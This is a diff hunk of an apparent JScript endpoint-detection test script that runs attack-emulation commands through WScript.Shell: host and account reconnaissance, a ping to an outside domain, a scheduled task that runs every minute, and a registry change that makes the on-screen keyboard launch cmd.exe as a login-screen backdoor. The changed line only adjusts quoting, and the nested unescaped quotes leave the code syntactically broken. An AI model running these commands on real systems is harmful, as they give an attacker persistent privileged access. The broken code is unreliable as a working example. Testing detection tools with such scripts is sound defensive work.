@@ -10,7 +10,7 @@ var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all");
 var r = new ActiveXObject("WScript.Shell").Run("arp -a");
 var r = new ActiveXObject("WScript.Shell").Run("ping nato-press.com");
 var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL");
-var r = new ActiveXObject("WScript.Shell").Run("REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe");
+var r = new ActiveXObject("WScript.Shell").Run("REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe"");
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo > c:\\edrtest\\systeminfo.txt");
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest.bat /sc minute");
 ]]>
